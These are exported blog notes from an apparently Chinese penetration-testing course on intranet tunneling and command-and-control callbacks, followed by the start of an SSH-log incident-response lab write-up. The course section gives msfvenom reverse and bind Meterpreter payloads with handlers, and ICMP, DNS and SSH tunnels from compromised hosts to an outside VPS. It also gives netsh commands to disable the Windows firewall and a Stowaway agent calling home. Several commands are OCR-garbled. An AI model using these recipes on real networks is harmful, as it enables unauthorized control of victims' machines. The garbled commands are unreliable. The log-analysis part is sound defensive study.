<p>1、入站&amp;出站&amp;连接安全</p>
<p>2、域&amp;专用&amp;公网&amp;状态</p>
<p>3、阻止&amp;允许&amp;其他配置</p>
<h4 id="单机-防火墙-限制协议出入站"><a href="#单机-防火墙-限制协议出入站" class="headerlink" title="#单机-防火墙-限制协议出入站"></a>#单机-防火墙-限制协议出入站</h4><p>熟悉常见主机配置不出网的方式</p>
<p>1、程序&amp;端口&amp;预定义&amp;自定义</p>
<p>2、协议&amp;TCP&amp;UDP&amp;ICMP&amp;L2TP 等</p>
<h4 id="域控-防火墙-组策略对象同步"><a href="#域控-防火墙-组策略对象同步" class="headerlink" title="#域控-防火墙-组策略对象同步"></a>#域控-防火墙-组策略对象同步</h4><p>熟悉常见主机配置不出网的操作流程</p>
<p>操作：组策略管理-域-创建 GPO 链接-防火墙设置</p>
<p>更新策略：强制&amp;命令&amp;重启</p>
<p>命令：gpupdate&#x2F;force</p>
<p>#域控-防火墙-组策略不出网上线</p>
<p>背景介绍：域控通过组策略设置防火墙规则同步后，域内用户主机被限制 TCP 出网，其</p>
<p>中规则为出站规则，安全研究者通过入站取得 SHELL 权限，需要对其进行上线控制。</p>
<p>思路：正向连接&amp;隧道技术</p>
<p>如果是入站被限制呢？反向连接&amp;隧道技术也可以解决（前提看限制的多不多）</p>
<p>ICMP 协议项目：</p>
<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
<p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<p>1、CS-ICMP-上线</p>
<p>VPS:</p>
<p>.&#x2F;pingtunnel -type server</p>
<p>肉鸡：(管理器运行)</p>
<p>pingtunnel.exe -type client -l 127.0.0.1:6666 -s 192.168.46.66 -t </p>
<p>192.168.46.66:7777 -tcp 1 -noprint 1 -nolog 1</p>
<p>CS:</p>
<p>监听器 1：127.0.0.1 6666</p>
<p>监听器 2：192.168.46.66 7777</p>
<p>生成监听器 1 的 Stager 后门肉鸡执行</p>
<p>2、MSF上线<br>生成后门:<br>msfvenom p windows&#x2F;meterpreter&#x2F;reverse tcp HOST&#x3D;127.0.0.1<br>LPORT&#x3D;3333 -f exe &gt; xd.exe<br>MS&#x3D;启动监听:<br>msfconso1e<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse tep<br>get lhest 0.0.0.0<br>set lport 4444<br>exploit<br>a11开启隧道:<br>&#x2F;pingtunnel -type server</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/42d2d6e5485a227110735fafee311311--dfb4--image-20240511083406029.png" alt="image-20240511083406029"></p>
<h1 id="第124天：内网安全-代理Socks协议-路由不出网-后渗透通讯-CS-MSF控制上线"><a href="#第124天：内网安全-代理Socks协议-路由不出网-后渗透通讯-CS-MSF控制上线" class="headerlink" title="第124天：内网安全-代理Socks协议&amp;路由不出网&amp;后渗透通讯&amp;CS-MSF控制上线"></a>第124天：内网安全-代理Socks协议&amp;路由不出网&amp;后渗透通讯&amp;CS-MSF控制上线</h1><h4 id="知识点：-58"><a href="#知识点：-58" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、代理软件使用-Win&amp;Linux</p>
<p>2、代理协议使用-Socks4&#x2F;5</p>
<p>3、CS&amp;MSF-网络通讯&amp;控制上线</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
<h4 id="系列点：-1"><a href="#系列点：-1" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理         </p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/67e4aaa79b879330b771633d8535143b--cf65--image-20240511083808897.png" alt="image-20240511083808897"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/6344854276615d72961db5c984fa1edc--d69d--image-20240511084449143.png" alt="image-20240511084449143"></p>
<h4 id="演示案例：-53"><a href="#演示案例：-53" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 网络通讯-MSF&amp;CS-路由添加&amp;节点建立</p>
<p> 控制上线-MSF&amp;CS-协议生成&amp;正反连接</p>
<h4 id="网络通讯-MSF-CS-路由添加-节点建立"><a href="#网络通讯-MSF-CS-路由添加-节点建立" class="headerlink" title="#网络通讯-MSF&amp;CS-路由添加&amp;节点建立"></a>#网络通讯-MSF&amp;CS-路由添加&amp;节点建立</h4><h4 id="控制上线-MSF-CS-协议生成-正反连接"><a href="#控制上线-MSF-CS-协议生成-正反连接" class="headerlink" title="#控制上线-MSF&amp;CS-协议生成&amp;正反连接"></a>#控制上线-MSF&amp;CS-协议生成&amp;正反连接</h4><p>代理协议：</p>
<p>SOCKS4&#x2F;5</p>
<p>代理软件：</p>
<p>SocksCap Proxifier ProxyChains 等</p>
<p>MSF 通讯</p>
<p>1、添加路由 限于 MSF</p>
<p>查看路由信息</p>
<p>run autoroute -p</p>
<p>run post&#x2F;multi&#x2F;manage&#x2F;autoroute</p>
<p>添加指定路由，1 是接收的 session 编号</p>
<p>route add 192.168.11.0 255.255.255.0 1</p>
<p>2、Sock 代理 全局同用</p>
<p>use auxiliary&#x2F;server&#x2F;socks_proxy</p>
<p>set srvhost 0.0.0.0</p>
<p>set srvport 1115</p>
<p>run</p>
<p>启用代理软件配置 Sock5 代理</p>
<p>CS 通讯</p>
<p>命令：socks 59578</p>
<p>操作：代理转发-Socks 代理</p>
<p>MSF 控制上线-正向连接</p>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 LPORT&#x3D;3333 </p>
<p>-f exe &gt; bd.exe</p>
<p>use exploit&#x2F;multi&#x2F;handler</p>
<p>set payload windows&#x2F;meterpreter&#x2F;bind_tcp</p>
<p>set rhost 192.168.11.129</p>
<p>set lport 3333</p>
<p>run</p>
<p>CS 控制上线-正向连接</p>
<p>监听器：bind_tcp port</p>
<p>命令：connect ip port</p>
<p>实验 2：二层（后续多层操作一致）</p>
<p>代理软件犖镫澌<br>Sockscap Proxifier Proxychains等</p>
<p>MSF通讯<br>1、添加路由 限于MSF<br>查看路由信息<br>run autoroute -p<br>run post&#x2F;multi&#x2F;manage&#x2F;autorcute<br>添加指定路由，1是接收的session编号<br>route add 192.168 11.0 255.255.255.0 1<br>2、sock代理 全局同用<br>use auxiliary&#x2F;server&#x2F;socks_proxy<br>set srvhost 0.0.0.0<br>set srvport 1115<br>run<br>启用代理软件配置Socks5代理<br>cs通讯<br>命令:Socks5 59578<br>操作:代理转发-Socks代理<br>MSE控制上线-正向连接<br>msfvenom p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 PORT&#x3D;3333</p>
<p>-f exe &gt; bd.exe<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set rhost 192.168.11.129<br>set lport 3333<br>run<br>cs控制上线-正向连接<br>监听器:bind tcp port<br>命令:connect ip port</p>
<h1 id="第125天：内网安全-隧道技术-SMB-ICMP-正反向连接-防火墙出入规则上线"><a href="#第125天：内网安全-隧道技术-SMB-ICMP-正反向连接-防火墙出入规则上线" class="headerlink" title="第125天：内网安全-隧道技术&amp;SMB&amp;ICMP&amp;正反向连接&amp;防火墙出入规则上线"></a>第125天：内网安全-隧道技术&amp;SMB&amp;ICMP&amp;正反向连接&amp;防火墙出入规则上线</h1><h4 id="知识点：-59"><a href="#知识点：-59" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、入站规则不出网上线方案</p>
<p>2、出站规则不出网上线方案</p>
<p>3、规则-隧道技术-SMB&amp;ICMP</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
<h4 id="系列点：-2"><a href="#系列点：-2" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/dd504fe86d60d41e5d808e194e458ce4--d9ee--image-20240511090624508.png" alt="image-20240511090624508"></p>
<h4 id="演示案例：-54"><a href="#演示案例：-54" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 不出网-控制上线-CS-反向连接</p>
<p> 不出网-控制上线-CS-SMB 隧道</p>
<p> 不出网-控制上线-CS-ICMP 隧道</p>
<p> 不出网-控制上线-CS-关闭防火墙</p>
<p><strong>windows是建立SMB通道 ，linux建立SSH通道</strong></p>
<p><strong>怎么知道对方是出站限制还是入站限制呢？</strong><br>上传正向和反向木马进行测试</p>
<p><strong>不出网-控制上线-CS-ICMP隧道</strong><br>使用icmp隧道绕过出站限制，细节见上一章内容<br>注：win10作为pingtunnel服务端，其他操作类似<br>……</p>
<p><strong>不出网-控制上线-CS-关闭防火墙</strong><br>如果取得目标机的高权限且，修改防火墙规则，关闭防火墙，以及替换防火墙规则里程序。<br>适用于：<br>1.单纯的内网环境(类似本次实验环境)，不是域环境<br>2.单纯的内网域环境(但是域控DC没有设置组策略防火墙同步)</p>
<p>入站过滤上线：</p>
<p>1、隧道技术硬刚</p>
<p>2、反向连接跳过</p>
<p>3、关闭&amp;删除&amp;替换</p>
<p>适用利用入站通行拿到的高权限</p>
<p>出站过滤上线：</p>
<p>1、隧道技术硬刚</p>
<p>2、正向连接跳过</p>
<p>3、关闭&amp;删除&amp;替换</p>
<p>适用利用入站通行拿到的高权限</p>
<p>隧道技术上线：</p>
<p>HTTP&#x2F;S &amp; DNS &amp; SSH &amp; ICMP &amp; SMB &amp; 协议穿透等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows 防火墙命令：</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/tomtellyou/p/16300557.html</span><br><span class="line"></span><br><span class="line">查看当前防火墙状态：netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">关闭防火墙：netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">开启防火墙：netsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line">恢复初始防火墙设置：netsh advfirewall reset</span><br><span class="line"></span><br><span class="line">启用桌面防火墙: netsh advfirewall set allprofiles state on</span><br><span class="line"></span><br><span class="line">设置默认输入和输出策略：netsh advfirewall set allprofiles firewallpolicy,allowinbound,allowoutbound</span><br><span class="line"></span><br><span class="line">如果设置为拒绝使用 blockinbound,blockoutbound</span><br></pre></td></tr></table></figure>

<h1 id="第126天：内网安全-隧道技术-SSH-DNS-ICMP-SMB-上线通讯Linux-Mac"><a href="#第126天：内网安全-隧道技术-SSH-DNS-ICMP-SMB-上线通讯Linux-Mac" class="headerlink" title="第126天：内网安全-隧道技术&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;上线通讯Linux&amp;Mac"></a>第126天：内网安全-隧道技术&amp;SSH&amp;DNS&amp;ICMP&amp;SMB&amp;上线通讯Linux&amp;Mac</h1><h4 id="知识点：-60"><a href="#知识点：-60" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、入站规则不出网上线方案</p>
<p>2、出站规则不出网上线方案</p>
<p>3、隧道技术-SMB&amp;ICMP&amp;DNS&amp;SSH</p>
<p>4、控制上线-Linux&amp;Mac&amp;IOS&amp;Android</p>
<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
<p>-内网穿透：解决网络控制上线&amp;网络通讯问题</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<h4 id="系列点：-3"><a href="#系列点：-3" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/63f4b1a104567b33b43cd8c1f8be375b--3e6f--image-20240511091624701.png" alt="image-20240511091624701"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/19753b8cfc1445cd20e5cd78f4224ff4--c9fc--image-20240511091655868.png" alt="image-20240511091655868"></p>
<h4 id="演示案例：-55"><a href="#演示案例：-55" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 隧道技术-SMB 协议-判断&amp;通讯&amp;上线</p>
<p> 隧道技术-ICMP 协议-判断&amp;通讯&amp;上线</p>
<p> 隧道技术-DNS 协议-判断&amp;通讯&amp;上线</p>
<p> 隧道技术-SSH 协议-判断&amp;通讯&amp;上线</p>
<p> 控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android</p>
<p>1、判断出网协议</p>
<p>2、使用出网协议建立隧道</p>
<p>#SMB 隧道&amp;通讯&amp;上线</p>
<p>判断：445 通讯</p>
<p>上线：借助通讯后绑定上线</p>
<p>通讯：直接 SMB 协议通讯即可</p>
<p>#ICMP 隧道&amp;通讯&amp;上线</p>
<p>判断：ping 命令</p>
<p>上线：见前面课程</p>
<p>通讯：其他项目(icmpsh icmptunnel)</p>
<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p>
<p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
<p>#DNS 隧道&amp;通讯&amp;上线</p>
<p>判断：nslookup dig</p>
<p>1、上线环境：内网主机只出网 DNS 协议数据，解决上线</p>
<p>-域名申请及配置</p>
<p>-监听器创建及配置</p>
<p>-后门绑定监听器及生成</p>
<p>2、通讯环境：</p>
<p>内网主机只出网 DNS 协议数据，解决通讯</p>
<p><a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p>
<p>判断出网：nslookup <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>-服务器：设置密码 xiaodi 并创建虚拟 IP 及绑定域名指向</p>
<p>iodined -f -c -P xiaodi 192.168.0.1 ns1.xiaodi8.com -DD</p>
<p>设置密码 xiaodi 并创建虚拟 IP 及绑定域名指向</p>
<p>-客户端：连接密码 xiaodi 并绑定域名指向</p>
<p>iodine -f -M 200 -P xiaodi ns1.xiaodi8.com</p>
<p>-尝试通讯尝试连接：</p>
<p>ssh <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#x32;">&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#48;&#46;&#x32;</a></p>
<p>#SSH 隧道&amp;通讯</p>
<p>判断：ssh 连接</p>
<p>1、上线：</p>
<p>由于 CS 无 SSH 协议监听器配置，无法上线</p>
<p>2、通讯：</p>
<p>由于SSH协议存在于Linux系统，跳板机必须Linux</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -F /* 清除所有规则 /</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT /允许包从22端口进入/</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT /允许从22端口进入的包返回/</span><br><span class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT / 域名解析端口，一般不开 /</span><br><span class="line">iptables -A INPUT -p udp --sport 53 -j ACCEPT / 域名解析端口，一般不开 /</span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT /允许本机访问本机/</span><br><span class="line">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT /允许所有IP访问80端口/</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables /保存配置/</span><br><span class="line">iptables -L / 显示iptables列表 */</span><br></pre></td></tr></table></figure>

<p>开启ssh协议登录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure>

<p>本地：入站封<br>将本地访问 10.10.10.132的流量转发至公网vps 1234端口上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R 1122:10.10.10.132:8080 root@47.94.130.xx</span><br><span class="line">curl http://127.0.0.1:1122</span><br></pre></td></tr></table></figure>

<p>远程：出站封<br>将本地访问10.10.10.132的流量转发至本地的1234的端口上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L 1234:10.10.10.132:8080 root@10.10.10.146</span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure>

<p>防御DNS隧道攻击的方法<br>禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。<br>虽然没有人会将TXT解析请求发送给DNS服务器，但是邮件服务器&#x2F;网关会这样做，因此，可以将邮件服务器&#x2F;网关列入白名单并阻止传入和传出流量中的TXT请求。<br>跟踪用户的DNS查询次数，如果达到阈值，就生成相应的报告</p>
<p>控制上线-插件-Linux&amp;Mac&amp;IOS&amp;Android<br>项目：<a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a><br>面向Linux Mac IOS Android系统上线支持<br>1、插件使用<br>2、命令使用<br>使用参考：<br><a href="https://gloxec.github.io/CrossC2/zh_cn/">https://gloxec.github.io/CrossC2/zh_cn/</a><br>1、下载对应版本加载器和CNA插件<br>2、上传加载器文件和本地加载CNA插件<br>3、修改CNA插件配置路径及上传Key文件<br>4、使用命令或插件绑定HTTPS监听器生成</p>
<p>使用CS4.7版本没有搭建成功</p>
<h1 id="第127天：内网安全-隧道搭建-穿透上线-FRP-NPS-SPP-Ngrok-EW项目"><a href="#第127天：内网安全-隧道搭建-穿透上线-FRP-NPS-SPP-Ngrok-EW项目" class="headerlink" title="第127天：内网安全-隧道搭建&amp;穿透上线&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EW项目"></a>第127天：内网安全-隧道搭建&amp;穿透上线&amp;FRP&amp;NPS&amp;SPP&amp;Ngrok&amp;EW项目</h1><h4 id="知识点：-61"><a href="#知识点：-61" class="headerlink" title="#知识点："></a>#知识点：</h4><p>1、内网隧道&amp;穿透&amp;加密&amp;上线</p>
<p>2、项目-Ngrok&amp;Frp&amp;Nps&amp;Spp</p>
<p>-连接方向：正向&amp;反向（基础课程有讲过）</p>
<p>-内网穿透：解决网络控制上线&amp;网络通讯问题</p>
<p>-隧道技术：解决不出网协议上线的问题（利用出网协议进行封装出网）</p>
<p>-代理技术：解决网络通讯不通的问题（利用跳板机建立节点后续操作）</p>
<h4 id="系列点：-4"><a href="#系列点：-4" class="headerlink" title="#系列点："></a>#系列点：</h4><p>1、判断什么时候用代理</p>
<p>2、判断什么时候用隧道</p>
<p>3、判断出网和不出网协议</p>
<p>4、如何使用代理建立节点并连接</p>
<p>5、如何使用隧道技术封装协议上线</p>
<p>6、判断哪些代理或隧道情况选择放弃</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-05-11/3d6e827033023f8a4d370bc1daaf216a--0495--image-20240511092308716.png" alt="image-20240511092308716"></p>
<h4 id="演示案例：-56"><a href="#演示案例：-56" class="headerlink" title="演示案例："></a>演示案例：</h4><p> 内网穿透-Ngrok-入门-上线</p>
<p> 内网穿透-Frp-简易型-上线</p>
<p> 内网穿透-Nps-自定义-上线</p>
<p> 内网穿透-Spp-特殊协议-上线</p>
<p>旨在代理连接肉鸡后实现本地渗透肉鸡网络架构</p>
<p>Linux：Proxychains</p>
<p>Windows：Sockscap Proxifier</p>
<p>穿透项目：Ngrok Frp Spp Nps EW(停更)</p>
<p>优点：穿透加密数据，中间平台，防追踪，解决网络问题</p>
<p><a href="https://www.ngrok.cc/">https://www.ngrok.cc</a></p>
<p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
<p><a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p>
<p><a href="http://www.rootkiter.com/EarthWorm">http://www.rootkiter.com/EarthWorm</a></p>
<p>内网穿透的隧道搭建有很多，这里就主要讲讲我使用的工具stowaway</p>
<p><a href="https://blog.csdn.net/qq_44159028/article/details/129681017">https://blog.csdn.net/qq_44159028/article/details/129681017</a>   参考链接</p>
<p>1、控制端配置</p>
<p>上传控制端到kali，使用被动模式，监听端口8000，并对通信进行加密秘钥为123。等待被控端的连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_admin -l 192.168.125.134:8000 -s 123</span><br></pre></td></tr></table></figure>

<p> #或者不指定ip默认监听0.0.0.0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./linux_x64_admin -l 8000 -s 123</span><br></pre></td></tr></table></figure>

<p>2、被控端配置</p>
<p>在win2012-1上执行，使用秘钥123连接控制端8000端口，并设置重连间隔时间，当控制端掉线时客户端每隔8s重连控制端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8</span><br></pre></td></tr></table></figure>

<p>然后就是在admin端去创建socks即可</p>
<h1 id="第128天：内网安全-横向移动-IPC-AT-SC命令-Impacket套件-CS插件-全自动"><a href="#第128天：内网安全-横向移动-IPC-AT-SC命令-Impacket套件-CS插件-全自动" class="headerlink" title="第128天：内网安全-横向移动&amp;IPC&amp;AT&amp;SC命令&amp;Impacket套件&amp;CS插件&amp;全自动"></a>第128天：内网安全-横向移动&amp;IPC&amp;AT&amp;SC命令&amp;Impacket套件&amp;CS插件&amp;全自动</h1>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应</title>
    <url>/2024/06/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<p>最近有一个应急响应的靶场，玄机应急响应，所以也就去研究研究应急响应相关的知识。</p>
<span id="more"></span>

<h1 id="第一章-应急响应"><a href="#第一章-应急响应" class="headerlink" title="第一章-应急响应"></a>第一章-应急响应</h1><h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><p><a href="https://blog.csdn.net/qq_50765147/article/details/135878715">https://blog.csdn.net/qq_50765147/article/details/135878715</a>  相关资料链接</p>
<p>首先就是进入题目，ssh连接后，我们可以尝试去读取一下Linux日志文件</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/3a0d9c411882c5bc7705afad91b22bb5--6149--image-20240603210232034.png" alt="image-20240603210232034"></p>
<h4 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h4><p>第一个任务就是有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割 小到大排序 例如flag{192.168.200.1,192.168.200.2}</p>
<p>第一个 Flag 的目标是查找爆破 SSH 服务 Root 账户的 IP，故这里我们需要分析 auth 日志，auth 日志常见于 Debian 系（这台靶机就是 Debian）</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/d28b0f9e7667d37d50f5622699501adf--f84c--4-1715845855.jpeg" alt="4-1715845855"></p>
<p>这里 auth 日志有两条，分别是<code>auth.log</code>和<code>auth.log.1</code>，我们的判断基础是这两个文件，其次这里我们需要判断出哪些爆破的是 Root 账号，所以需要搜索 “Failed password for root”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拓展：</span><br><span class="line">.1 表示较早的日志文件，而没有 .1 的文件是当前的日志文件</span><br></pre></td></tr></table></figure>

<p>使用grep去进行查找</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password for root&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/74b48a05cdfb4800616bc807fbcb31d2--d076--image-20240603210808371.png" alt="image-20240603210808371"></p>
<p>使用awk进行ip提取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| awk &#x27;&#123;print $11&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>使用sort排序，使用unip -c 进行去重，使用sort -nr进行降序排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/62ed66c571e83333a1943dd791734695--300b--image-20240603211111911.png" alt="image-20240603211111911"></p>
<p>成功获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 192.168.200.2</span><br><span class="line">1 192.168.200.32</span><br><span class="line">1 192.168.200.31</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.31,192.168.200.32&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二"><a href="#任务二" class="headerlink" title="任务二"></a>任务二</h4><p>2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/1abf55deb21c8f1fe461ea49fd144171--5b7b--image-20240603211809586.png" alt="image-20240603211809586"></p>
<p>这里成功找到登录成功会有Accepted出现，我们按上面做的那样即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Accepted&quot; | awk &#x27;&#123;print $11&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 192.168.200.2</span><br><span class="line">1 221.130.58.74</span><br></pre></td></tr></table></figure>

<p>这里要注意的是，221开头的ip是我们本机登录的ip，所以应该剔除掉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三"><a href="#任务三" class="headerlink" title="任务三"></a>任务三</h4><p>3.爆破用户名字典是什么？如果有多个使用”,”分割</p>
<p>直接还是提取</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/166eefc9427d7cc88c7dce4e154b5ef1--0ad4--image-20240603213108197.png" alt="image-20240603213108197"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p>这里就可以直接拿到字典了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<p>这里涉及到一个perl语言</p>
<h4 id="任务四"><a href="#任务四" class="headerlink" title="任务四"></a>任务四</h4><p>4.成功登录 root 用户的 ip 一共爆破了多少次</p>
<p>其实第一问的时候已经看到了的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/e47bb3e3102e99f799387197b0fc70b1--0f87--image-20240603214219501.png" alt="image-20240603214219501"></p>
<p>直接出就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 /var/log/auth.log | grep -a &quot;Failed password&quot; | awk &#x27;&#123;if($11==&quot;192.168.200.2&quot;) print $11&#125;&#x27;|sort|uniq -c</span><br></pre></td></tr></table></figure>

<h4 id="任务五"><a href="#任务五" class="headerlink" title="任务五"></a>任务五</h4><p>5.黑客登陆主机后新建了一个后门用户，用户名是多少</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/5b59259fb061754a82bc6ef3f20df148--5c64--image-20240603214722593.png" alt="image-20240603214722593"></p>
<p>在这个地方注意，黑客添加了test2这个用户作为后门</p>
<p>这里有一点要注意，后边有个debian用户的创建，这个是我们ssh连接的用户，不是黑客创建的</p>
<h2 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h2><h4 id="任务一-1"><a href="#任务一-1" class="headerlink" title="任务一"></a>任务一</h4><p>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p>
<p>直接用d盾或者火绒即可</p>
